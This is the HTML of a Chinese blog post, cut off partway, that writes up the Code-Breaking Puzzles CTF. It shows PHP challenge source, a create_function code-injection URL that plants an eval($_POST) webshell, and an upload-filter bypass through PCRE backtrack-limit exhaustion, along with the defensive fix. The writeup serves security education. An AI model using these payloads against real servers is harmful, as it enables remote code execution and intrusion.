@@ -1,0 +1,4803 @@
+<!DOCTYPE html>
+<html lang="zh-Hans">
+    <!-- title -->
+
+
+
+
+<!-- keywords -->
+
+
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no" >
+    <meta name="author" content="LoRexxar">
+    <meta name="renderer" content="webkit">
+    <meta name="copyright" content="LoRexxar">
+    
+    <meta name="keywords" content="LoRexxar,hexo-blog">
+    
+    <meta name="description" content="">
+    <meta name="description" content="@phith0n在代码审计小密圈二周年的时候发起了Code-Breaking Puzzles挑战赛，其中包含了php、java、js、python各种硬核的代码审计技巧。在研究复现the js的过程中，我花费了大量的精力，也逐渐找到代码审计的一些技巧，这里主要分享了5道ez题目和1道hard的the js这道题目的writeup，希望阅读本文的你可以从题目中学习到属于代码审计的思考逻辑和技巧。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Code Breaking挑战赛 Writeup">
+<meta property="og:url" content="https://lorexxar.cn/2018/12/07/codingbreak-wp/index.html">
+<meta property="og:site_name" content="LoRexxar&#39;s Blog">
+<meta property="og:description" content="@phith0n在代码审计小密圈二周年的时候发起了Code-Breaking Puzzles挑战赛，其中包含了php、java、js、python各种硬核的代码审计技巧。在研究复现the js的过程中，我花费了大量的精力，也逐渐找到代码审计的一些技巧，这里主要分享了5道ez题目和1道hard的the js这道题目的writeup，希望阅读本文的你可以从题目中学习到属于代码审计的思考逻辑和技巧。">
+<meta property="og:image" content="http://static.zybuluo.com/LoRexxar/cbo3ltlsxrnjxh8jqiulbjha/image.png">
+<meta property="og:image" content="http://static.zybuluo.com/LoRexxar/rx2eagas7du6o0pf4d91g5e8/image.png">
+<meta property="og:image" content="http://static.zybuluo.com/LoRexxar/hc8h3y7vvo3nce9i15jj1eqm/image.png">
+<meta property="og:image" content="http://static.zybuluo.com/LoRexxar/gwwvk7egkhj27k2zon6f2bc2/image.png">
+<meta property="og:image" content="http://static.zybuluo.com/LoRexxar/rml8zqyl2jy183cjel8df6av/image.png">
+<meta property="og:image" content="http://static.zybuluo.com/LoRexxar/aa3bs1plfwhlg5nm69i3wmem/image.png">
+<meta property="og:image" content="http://static.zybuluo.com/LoRexxar/v2u053p38hbpsdy3c08koj20/image.png">
+<meta property="og:image" content="http://static.zybuluo.com/LoRexxar/c9tepy22r9k6563g29kw8pr8/image.png">
+<meta property="og:image" content="http://static.zybuluo.com/LoRexxar/9ri7yi46c9cqch7tzzz1sr2u/image.png">
+<meta property="og:image" content="http://static.zybuluo.com/LoRexxar/c15jhqn4pixvau8ixc7n1is5/image.png">
+<meta property="og:image" content="http://static.zybuluo.com/LoRexxar/vq8bm8hefnnzscxpz8f7ka7d/image.png">
+<meta property="og:image" content="http://static.zybuluo.com/LoRexxar/sviykeendizwzekf4tbttbkz/image.png">
+<meta property="og:image" content="http://static.zybuluo.com/LoRexxar/klcd2lie0pz82a9by3fqh7ov/image.png">
+<meta property="og:image" content="http://static.zybuluo.com/LoRexxar/zkj2j6o7n6j2kz6kptgx57xr/image.png">
+<meta property="og:image" content="http://static.zybuluo.com/LoRexxar/vz39az7wgimmauv33eukobbn/image.png">
+<meta property="og:image" content="http://static.zybuluo.com/LoRexxar/vka9pxexoj8vnmxf1ilsdwwy/image.png">
+<meta property="og:image" content="http://static.zybuluo.com/LoRexxar/jueyk32hl7ip4n364y6gwhpf/image.png">
+<meta property="og:image" content="http://static.zybuluo.com/LoRexxar/hewv5e9mzsu34ucce367cjug/image.png">
+<meta property="og:image" content="http://static.zybuluo.com/LoRexxar/3mk7jhioca1p0q8f464papay/image.png">
+<meta property="og:image" content="http://static.zybuluo.com/LoRexxar/md4rru83wquxs62kricum5a1/image.png">
+<meta property="og:image" content="http://static.zybuluo.com/LoRexxar/ae0fr6ms7z7esyvagwbmbx2e/image.png">
+<meta property="og:image" content="http://static.zybuluo.com/LoRexxar/ps6iu6zj7j8wk4dv9mtpdiau/image.png">
+<meta property="og:image" content="http://static.zybuluo.com/LoRexxar/9sth0qe2l1jmrtwbodrcrezz/image.png">
+<meta property="og:image" content="http://static.zybuluo.com/LoRexxar/7pvi42gqs8ykm439pcg0vl9t/image.png">
+<meta property="og:image" content="http://static.zybuluo.com/LoRexxar/pjmb7nlix7afzs7emfwm2e4j/image.png">
+<meta property="article:published_time" content="2018-12-07T03:32:39.000Z">
+<meta property="article:modified_time" content="2018-12-07T03:34:02.000Z">
+<meta property="article:author" content="LoRexxar">
+<meta property="article:tag" content="php">
+<meta property="article:tag" content="node">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://static.zybuluo.com/LoRexxar/cbo3ltlsxrnjxh8jqiulbjha/image.png">
+    <meta http-equiv="Cache-control" content="no-cache">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
+    
+    <link rel="alternate" href="/atom.xml" title="LoRexxar&#39;s Blog" type="application/atom+xml">
+    
+    <title>Code Breaking挑战赛 Writeup · LoRexxar&#39;s Blog</title>
+    <style type="text/css">
+    @font-face {
+        font-family: 'Oswald-Regular';
+        src: url("/font/Oswald-Regular.ttf");
+    }
+
+    body {
+        margin: 0;
+    }
+
+    header,
+    footer,
+    .back-top,
+    .sidebar,
+    .container,
+    .site-intro-meta,
+    .toc-wrapper {
+        display: none;
+    }
+
+    .site-intro {
+        position: relative;
+        z-index: 3;
+        width: 100%;
+        /* height: 50vh; */
+        overflow: hidden;
+    }
+
+    .site-intro-placeholder {
+        position: absolute;
+        z-index: -2;
+        top: 0;
+        left: 0;
+        width: calc(100% + 300px);
+        height: 100%;
+        background: repeating-linear-gradient(-45deg, #444 0, #444 80px, #333 80px, #333 160px);
+        background-position: center center;
+        transform: translate3d(-226px, 0, 0);
+        animation: gradient-move 2.5s ease-out 0s infinite;
+    }
+
+    @keyframes gradient-move {
+        0% {
+            transform: translate3d(-226px, 0, 0);
+        }
+        100% {
+            transform: translate3d(0, 0, 0);
+        }
+    }
+
+</style>
+
+    <link rel="preload" href= "/css/style.css?v=20180824" as="style" onload="this.onload=null;this.rel='stylesheet'" />
+    <link rel="stylesheet" href= "/css/mobile.css?v=20180824" media="(max-width: 980px)">
+    
+    <link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'" />
+    
+    <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
+/* This file is meant as a standalone workflow for
+- testing support for link[rel=preload]
+- enabling async CSS loading in browsers that do not support rel=preload
+- applying rel preload css once loaded, whether supported or not.
+*/ -->
+<script>
+(function( w ){
+	"use strict";
+	// rel=preload support test
+	if( !w.loadCSS ){
+		w.loadCSS = function(){};
+	}
+	// define on the loadCSS obj
+	var rp = loadCSS.relpreload = {};
+	// rel=preload feature support test
+	// runs once and returns a function for compat purposes
+	rp.support = (function(){
+		var ret;
+		try {
+			ret = w.document.createElement( "link" ).relList.supports( "preload" );
+		} catch (e) {
+			ret = false;
+		}
+		return function(){
+			return ret;
+		};
+	})();
+
+	// if preload isn't supported, get an asynchronous load by using a non-matching media attribute
+	// then change that media back to its intended value on load
+	rp.bindMediaToggle = function( link ){
+		// remember existing media attr for ultimate state, or default to 'all'
+		var finalMedia = link.media || "all";
+
+		function enableStylesheet(){
+			link.media = finalMedia;
+		}
+
+		// bind load handlers to enable media
+		if( link.addEventListener ){
+			link.addEventListener( "load", enableStylesheet );
+		} else if( link.attachEvent ){
+			link.attachEvent( "onload", enableStylesheet );
+		}
+
+		// Set rel and non-applicable media type to start an async request
+		// note: timeout allows this to happen async to let rendering continue in IE
+		setTimeout(function(){
+			link.rel = "stylesheet";
+			link.media = "only x";
+		});
+		// also enable media after 3 seconds,
+		// which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
+		setTimeout( enableStylesheet, 3000 );
+	};
+
+	// loop through link elements in DOM
+	rp.poly = function(){
+		// double check this to prevent external calls from running
+		if( rp.support() ){
+			return;
+		}
+		var links = w.document.getElementsByTagName( "link" );
+		for( var i = 0; i < links.length; i++ ){
+			var link = links[ i ];
+			// qualify links to those with rel=preload and as=style attrs
+			if( link.rel === "preload" && link.getAttribute( "as" ) === "style" && !link.getAttribute( "data-loadcss" ) ){
+				// prevent rerunning on link
+				link.setAttribute( "data-loadcss", true );
+				// bind listeners to toggle media back
+				rp.bindMediaToggle( link );
+			}
+		}
+	};
+
+	// if unsupported, run the polyfill
+	if( !rp.support() ){
+		// run once at least
+		rp.poly();
+
+		// rerun poly on an interval until onload
+		var run = w.setInterval( rp.poly, 500 );
+		if( w.addEventListener ){
+			w.addEventListener( "load", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		} else if( w.attachEvent ){
+			w.attachEvent( "onload", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		}
+	}
+
+
+	// commonjs
+	if( typeof exports !== "undefined" ){
+		exports.loadCSS = loadCSS;
+	}
+	else {
+		w.loadCSS = loadCSS;
+	}
+}( typeof global !== "undefined" ? global : this ) );
+</script>
+
+    <link rel="icon" href= "/./img/699-14040QPP9.jpg" />
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js" as="script" />
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js" as="script" />
+    <link rel="preload" href="/scripts/main.js" as="script" />
+    <link rel="preload" as="font" href="/font/Oswald-Regular.ttf" crossorigin>
+    <link rel="preload" as="font" href="https://at.alicdn.com/t/font_327081_1dta1rlogw17zaor.woff" crossorigin>
+    
+    <!-- fancybox -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.js" defer></script>
+    <!-- 百度统计  -->
+    
+    <script>
+        var _hmt = _hmt || [];
+        (function () {
+        var hm = document.createElement("script");
+        hm.src = "https://hm.baidu.com/hm.js?736cd32ff67d23a009e16622fd600527";
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(hm, s);
+        })();
+    </script>
+    
+    <!-- 谷歌统计  -->
+    
+    <script>
+        (function (i, s, o, g, r, a, m) {
+        i['GoogleAnalyticsObject'] = r; i[r] = i[r] || function () {
+        (i[r].q = i[r].q || []).push(arguments)
+        }, i[r].l = 1 * new Date(); a = s.createElement(o),
+        m = s.getElementsByTagName(o)[0]; a.async = 1; a.src = g; m.parentNode.insertBefore(a, m)
+        })(window, document, 'script', 'https://www.google-analytics.com/analytics.js', 'ga');
+        ga('create', 'UA-127222426-1', 'auto');
+        ga('send', 'pageview');
+    </script>
+    
+<meta name="generator" content="Hexo 4.2.1"></head>
+
+    
+        <body class="post-body">
+    
+    
+<header class="header">
+
+    <div class="read-progress"></div>
+    <div class="header-sidebar-menu">&#xe775;</div>
+    <!-- post页的toggle banner  -->
+    
+    <div class="banner">
+            <div class="blog-title">
+                <a href="/" >LoRexxar&#39;s Blog</a>
+            </div>
+            <div class="post-title">
+                <a href="#" class="post-name">Code Breaking挑战赛 Writeup</a>
+            </div>
+    </div>
+    
+    <a class="home-link" href=/>LoRexxar's Blog</a>
+</header>
+    <div class="wrapper">
+        <div class="site-intro" style="
+
+
+
+
+
+
+
+height:50vh;
+">
+    
+    <!-- 主页  -->
+    
+    
+    <!-- 404页  -->
+            
+    <div class="site-intro-placeholder"></div>
+    <div class="site-intro-img" style="background-image: url(/intro/post-bg.jpg)"></div>
+    <div class="site-intro-meta">
+        <!-- 标题  -->
+        <h1 class="intro-title">
+            <!-- 主页  -->
+            
+            Code Breaking挑战赛 Writeup
+            <!-- 404 -->
+            
+        </h1>
+        <!-- 副标题 -->
+        <p class="intro-subtitle">
+            <!-- 主页副标题  -->
+            
+            
+            <!-- 404 -->
+            
+        </p>
+        <!-- 文章页meta -->
+        
+            <div class="post-intros">
+                <!-- 文章页标签  -->
+                
+                    <div class= post-intro-tags >
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "php">php</a>
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "node">node</a>
+    
+</div>
+                
+                
+                    <div class="post-intro-read">
+                        <span>字数统计: <span class="post-count word-count">4.3k</span>阅读时长: <span class="post-count reading-time">17 min</span></span>
+                    </div>
+                
+                <div class="post-intro-meta">
+                    <span class="post-intro-calander iconfont-archer">&#xe676;</span>
+                    <span class="post-intro-time">2018/12/07</span>
+                    
+                    <span id="busuanzi_container_page_pv" class="busuanzi-pv">
+                        <span class="iconfont-archer">&#xe602;</span>
+                        <span id="busuanzi_value_page_pv"></span>
+                    </span>
+                    
+                    <span class="shareWrapper">
+                        <span class="iconfont-archer shareIcon">&#xe71d;</span>
+                        <span class="shareText">Share</span>
+                        <ul class="shareList">
+                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
+                                <div class="share-qrcode"></div>
+                            </li>
+                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
+                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
+                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
+                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
+                        </ul>
+                    </span>
+                </div>
+            </div>
+        
+    </div>
+</div>
+        <script>
+ 
+  // get user agent
+  var browser = {
+    versions: function () {
+      var u = window.navigator.userAgent;
+      return {
+        userAgent: u,
+        trident: u.indexOf('Trident') > -1, //IE内核
+        presto: u.indexOf('Presto') > -1, //opera内核
+        webKit: u.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
+        gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //火狐内核
+        mobile: !!u.match(/AppleWebKit.*Mobile.*/), //是否为移动终端
+        ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
+        android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //android终端或者uc浏览器
+        iPhone: u.indexOf('iPhone') > -1 || u.indexOf('Mac') > -1, //是否为iPhone或者安卓QQ浏览器
+        iPad: u.indexOf('iPad') > -1, //是否为iPad
+        webApp: u.indexOf('Safari') == -1, //是否为web应用程序，没有头部与底部
+        weixin: u.indexOf('MicroMessenger') == -1, //是否为微信浏览器
+        uc: u.indexOf('UCBrowser') > -1 //是否为android下的UC浏览器
+      };
+    }()
+  }
+  console.log("userAgent:" + browser.versions.userAgent);
+
+  // callback
+  function fontLoaded() {
+    console.log('font loaded');
+    if (document.getElementsByClassName('site-intro-meta')) {
+      document.getElementsByClassName('intro-title')[0].classList.add('intro-fade-in');
+      document.getElementsByClassName('intro-subtitle')[0].classList.add('intro-fade-in');
+      var postIntros = document.getElementsByClassName('post-intros')[0]
+      if (postIntros) {
+        postIntros.classList.add('post-fade-in');
+      }
+    }
+  }
+
+  // UC不支持跨域，所以直接显示
+  function asyncCb(){
+    if (browser.versions.uc) {
+      console.log("UCBrowser");
+      fontLoaded();
+    } else {
+      WebFont.load({
+        custom: {
+          families: ['Oswald-Regular']
+        },
+        loading: function () {  //所有字体开始加载
+          // console.log('loading');
+        },
+        active: function () {  //所有字体已渲染
+          fontLoaded();
+        },
+        inactive: function () { //字体预加载失败，无效字体或浏览器不支持加载
+          console.log('inactive: timeout');
+          fontLoaded();
+        },
+        timeout: 5000 // Set the timeout to two seconds
+      });
+    }
+  }
+
+  function asyncErr(){
+    console.warn('script load from CDN failed, will load local script')
+  }
+
+  // load webfont-loader async, and add callback function
+  function async(u, cb, err) {
+    var d = document, t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0];
+    o.src = u;
+    if (cb) { o.addEventListener('load', function (e) { cb(null, e); }, false); }
+    if (err) { o.addEventListener('error', function (e) { err(null, e); }, false); }
+    s.parentNode.insertBefore(o, s);
+  }
+
+  var asyncLoadWithFallBack = function(arr, success, reject) {
+      var currReject = function(){
+        reject()
+        arr.shift()
+        if(arr.length)
+          async(arr[0], success, currReject)
+        }
+
+      async(arr[0], success, currReject)
+  }
+
+  asyncLoadWithFallBack([
+    "https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js", 
+    "https://cdn.bootcss.com/webfont/1.6.28/webfontloader.js",
+    "/lib/webfontloader.min.js"
+  ], asyncCb, asyncErr)
+</script>        
+        <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
+        <div class="container container-unloaded">
+            <main class="main post-page">
+    <article class="article-entry">
+        <p>@phith0n在代码审计小密圈二周年的时候发起了Code-Breaking Puzzles挑战赛，其中包含了php、java、js、python各种硬核的代码审计技巧。在研究复现the js的过程中，我花费了大量的精力，也逐渐找到代码审计的一些技巧，这里主要分享了5道ez题目和1道hard的the js这道题目的writeup，希望阅读本文的你可以从题目中学习到属于代码审计的思考逻辑和技巧。</p>
+<a id="more"></a>
+
+<h1 id="easy-function"><a href="#easy-function" class="headerlink" title="easy - function"></a>easy - function</h1><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">  <span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">$action = $_GET[<span class="string">'action'</span>] ?? <span class="string">''</span>;</span></span><br><span class="line"><span class="php">$arg = $_GET[<span class="string">'arg'</span>] ?? <span class="string">''</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="keyword">if</span>(preg_match(<span class="string">'/^[a-z0-9_]*$/isD'</span>, $action)) &#123;</span></span><br><span class="line"><span class="php">    show_source(<span class="keyword">__FILE__</span>);</span></span><br><span class="line"><span class="php">&#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="php">    $action(<span class="string">''</span>, $arg);</span></span><br><span class="line"><span class="php">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>思路还算是比较清晰，正则很明显，就是要想办法在函数名的头或者尾找一个字符，不影响函数调用。</p>
+<p>简单实验了一下没找到，那就直接fuzz起来吧</p>
+<p><img src="http://static.zybuluo.com/LoRexxar/cbo3ltlsxrnjxh8jqiulbjha/image.png" alt="image.png-175.2kB"></p>
+<p>很容易就fuzz到了就是<code>\</code>这个符号</p>
+<p>后来稍微翻了翻别人的writeup，才知道元婴，<strong>在PHP的命名空间默认为<code>\</code>，所有的函数和类都在<code>\</code>这个命名空间中，如果直接写函数名function_name()调用，调用的时候其实相当于写了一个相对路径；而如果写\function_name() 这样调用函数，则其实是写了一个绝对路径。如果你在其他namespace里调用系统类，就必须写绝对路径这种写法。</strong></p>
+<p>紧接着就到了如何只控制第二个参数来执行命令的问题了，后来找到可以用<code>create_function</code>来完成，<code>create_function</code>的第一个参数是参数，第二个参数是内容。</p>
+<p>函数结构形似</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">create_function(<span class="string">'$a,$b'</span>,<span class="string">'return 111'</span>)</span><br><span class="line"></span><br><span class="line">==&gt;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">a</span><span class="params">($a, $b)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">111</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>然后执行，如果我们想要执行任意代码，就首先需要跳出这个函数定义。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">create_function(<span class="string">'$a,$b'</span>,<span class="string">'return 111;&#125;phpinfo();//'</span>)</span><br><span class="line"></span><br><span class="line">==&gt;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">a</span><span class="params">($a, $b)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">111</span>;&#125;phpinfo();<span class="comment">//</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这样一来，我们想要执行的代码就会执行</p>
+<p>exp</p>
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">51.158</span>.<span class="number">75.42</span>:<span class="number">8087</span>/?action=%5Ccreate_function&amp;arg=<span class="keyword">return</span>%202333;%7Deval($_POST%5B%27ddog%27%5D);%2f%2f</span><br></pre></td></tr></table></figure>
+<p><img src="http://static.zybuluo.com/LoRexxar/rx2eagas7du6o0pf4d91g5e8/image.png" alt="image.png-251kB"></p>
+<h1 id="easy-pcrewaf"><a href="#easy-pcrewaf" class="headerlink" title="easy pcrewaf"></a>easy pcrewaf</h1><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"> <span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="function"><span class="keyword">function</span> <span class="title">is_php</span><span class="params">($data)</span></span>&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">return</span> preg_match(<span class="string">'/&lt;\?.*[(`;?&gt;].*/is'</span>, $data);</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="keyword">if</span>(<span class="keyword">empty</span>($_FILES)) &#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">die</span>(show_source(<span class="keyword">__FILE__</span>));</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php">$user_dir = <span class="string">'./data/'</span>;</span></span><br><span class="line"><span class="php">$data = file_get_contents($_FILES[<span class="string">'file'</span>][<span class="string">'tmp_name'</span>]);</span></span><br><span class="line"><span class="php"><span class="keyword">if</span> (is_php($data)) &#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> <span class="string">"bad request"</span>;</span></span><br><span class="line"><span class="php">&#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="php">    @mkdir($user_dir, <span class="number">0755</span>);</span></span><br><span class="line"><span class="php">    $path = $user_dir . <span class="string">'/'</span> . random_int(<span class="number">0</span>, <span class="number">10</span>) . <span class="string">'.php'</span>;</span></span><br><span class="line"><span class="php">    move_uploaded_file($_FILES[<span class="string">'file'</span>][<span class="string">'tmp_name'</span>], $path);</span></span><br><span class="line"></span><br><span class="line"><span class="php">    header(<span class="string">"Location: $path"</span>, <span class="keyword">true</span>, <span class="number">303</span>);</span></span><br><span class="line"><span class="php">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>这题自己研究的时候没想到怎么做，不过思路很清楚，文件名不可控，唯一能控制的就是文件内容。</p>
+<p>所以问题的症结就在于如何绕过这个正则表达式。</p>
+<figure class="highlight inform7"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/&lt;\?.*<span class="comment">[(`;?&gt;]</span>.*/<span class="keyword">is</span></span><br></pre></td></tr></table></figure>
+
+<p>简单来说就是<code>&lt;</code>后面不能有问号，<code>&lt;?</code>后面不能有<code>(;?&gt;反引号</code>，但很显然，这是不可能的，最少执行函数也需要括号才行。从常规的思路肯定不行</p>
+<p><a href="https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html</a></p>
+<p>之后看ph师傅的文章我们看到了问题所在，<code>pcre.backtrack_limit</code>这个配置决定了在php中，正则引擎回溯的层数。而这个值默认是1000000.</p>
+<p><img src="http://static.zybuluo.com/LoRexxar/hc8h3y7vvo3nce9i15jj1eqm/image.png" alt="image.png-53.5kB"></p>
+<p>而什么是正则引擎回溯呢？</p>
+<p>在正则中<code>.*</code>表示匹配任意字符任意位，也就是说他会匹配所有的字符，而正则引擎在解析正则的时候必然是逐位匹配的，对于</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?<span class="function">php <span class="title">phpinfo</span><span class="params">()</span></span>;<span class="comment">//faaaaaaaaaaaaaaaaaaaaaaaaaa</span></span><br></pre></td></tr></table></figure>
+<p>这段代码来说</p>
+<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">首先&lt;匹配&lt;</span><br><span class="line">然后?匹配?</span><br><span class="line">然后.*会直接匹配到结尾php phpinfo()<span class="comment">;//faaaaaaaaaaaaaaaaaaaaaaaaaa</span></span><br><span class="line">紧接着匹配[(`<span class="comment">;?&gt;]，问题出现了，上一步匹配到了结尾，后面没有满足要求的符号了。</span></span><br><span class="line"></span><br><span class="line">从这里开始正则引擎就开始逐渐回溯，知道符合要求的<span class="comment">;出现为止</span></span><br></pre></td></tr></table></figure>
+
+<p>但很显然，服务端不可能不做任何限制，不然如果post一个无限长的数据，那么服务端就会浪费太多的资源在这里，所以就有了<code>pcre.backtrack_limit</code>，如果回溯次数超过100万次，那么匹配就会结束，然后跳过这句语句。</p>
+<p>回到题目来看，如果能够跳过这句语句，我们就能上传任意文件内容了！</p>
+<p>所以最终post就是传一个内容为</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?<span class="function">php <span class="title">phpinfo</span><span class="params">()</span></span>;<span class="comment">//a*1000000</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="http://static.zybuluo.com/LoRexxar/gwwvk7egkhj27k2zon6f2bc2/image.png" alt="image.png-236.8kB"></p>
+<p>对于任何一种引擎来说都涉及到这个问题，尤其对于文件内容来说，没办法控制文件的长度，也就不可避免的会出现这样的问题。</p>
+<p>对于PHP来说，有这样一个解决办法，在php的正则文档中提到这样一个问题<br><img src="http://static.zybuluo.com/LoRexxar/rml8zqyl2jy183cjel8df6av/image.png" alt="image.png-38.6kB"></p>
+<p><code>preg_match</code>返回的是匹配到的次数，如果匹配不到会返回0，如果报错就会返回false</p>
+<p>所以，对<code>preg_match</code>来说，只要对返回结果有判断，就可以避免这样的问题。</p>
+<h1 id="easy-phpmagic"><a href="#easy-phpmagic" class="headerlink" title="easy - phpmagic"></a>easy - phpmagic</h1><p>题目代码简化之后如下</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"> <span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'read-source'</span>])) &#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">exit</span>(show_source(<span class="keyword">__FILE__</span>));</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php">define(<span class="string">'DATA_DIR'</span>, dirname(<span class="keyword">__FILE__</span>) . <span class="string">'/data/'</span> . md5($_SERVER[<span class="string">'REMOTE_ADDR'</span>]));</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="keyword">if</span>(!is_dir(DATA_DIR)) &#123;</span></span><br><span class="line"><span class="php">    mkdir(DATA_DIR, <span class="number">0755</span>, <span class="keyword">true</span>);</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php">chdir(DATA_DIR);</span></span><br><span class="line"></span><br><span class="line"><span class="php">$domain = <span class="keyword">isset</span>($_POST[<span class="string">'domain'</span>]) ? $_POST[<span class="string">'domain'</span>] : <span class="string">''</span>;</span></span><br><span class="line"><span class="php">$log_name = <span class="keyword">isset</span>($_POST[<span class="string">'log'</span>]) ? $_POST[<span class="string">'log'</span>] : date(<span class="string">'-Y-m-d'</span>);</span></span><br><span class="line"><span class="php"><span class="keyword">if</span>(!<span class="keyword">empty</span>($_POST) &amp;&amp; $domain):</span></span><br><span class="line"><span class="php">    $command = sprintf(<span class="string">"dig -t A -q %s"</span>, escapeshellarg($domain));</span></span><br><span class="line"><span class="php">    $output = shell_exec($command);</span></span><br><span class="line"></span><br><span class="line"><span class="php">    $output = htmlspecialchars($output, ENT_HTML401 | ENT_QUOTES);</span></span><br><span class="line"></span><br><span class="line"><span class="php">    $log_name = $_SERVER[<span class="string">'SERVER_NAME'</span>] . $log_name;</span></span><br><span class="line"><span class="php">    <span class="keyword">if</span>(!in_array(pathinfo($log_name, PATHINFO_EXTENSION), [<span class="string">'php'</span>, <span class="string">'php3'</span>, <span 